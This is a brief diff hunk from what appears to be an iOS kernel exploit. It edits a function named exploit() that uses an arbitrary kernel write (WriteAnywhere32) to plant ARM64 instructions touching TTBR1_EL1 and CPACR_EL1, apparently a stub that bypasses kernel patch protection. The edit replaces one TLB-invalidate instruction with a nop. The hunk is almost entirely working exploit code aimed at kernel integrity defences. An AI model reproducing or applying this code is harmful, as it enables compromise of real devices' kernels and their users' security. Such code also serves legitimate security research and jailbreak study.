@@ -434,10 +434,9 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         WriteAnywhere32(kppsh+n, 0xd5182020); n+=4; // msr	TTBR1_EL1, x0
         WriteAnywhere32(kppsh+n, 0xd2a00600); n+=4; // movz	x0, #0x30, lsl #16
         WriteAnywhere32(kppsh+n, 0xd5181040); n+=4; // msr	CPACR_EL1, x0
-
         WriteAnywhere32(kppsh+n, 0xd5182021); n+=4; // msr	TTBR1_EL1, x1
         WriteAnywhere32(kppsh+n, 0x10ffffe0); n+=4; // adr	x0, #-4
-        WriteAnywhere32(kppsh+n, 0xd5088720); n+=4; // tlbi	vae1, x0
+        WriteAnywhere32(kppsh+n, 0xd503201f); n+=4; // nop
         WriteAnywhere32(kppsh+n, 0xd508873e); n+=4; // tlbi	vae1, x30
         WriteAnywhere32(kppsh+n, 0xd5033fdf); n+=4; // isb
         WriteAnywhere32(kppsh+n, 0xd65f03c0); n+=4; // ret
